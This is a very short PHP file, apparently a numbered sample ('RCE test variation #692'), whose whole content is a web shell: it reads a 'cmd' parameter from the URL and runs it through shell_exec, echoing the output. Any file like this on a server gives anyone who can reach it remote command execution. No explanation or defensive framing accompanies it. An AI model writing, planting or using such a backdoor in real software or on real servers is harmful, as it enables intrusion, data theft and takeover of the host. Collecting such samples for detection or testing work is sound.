<?php
// RCE test variation #692
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>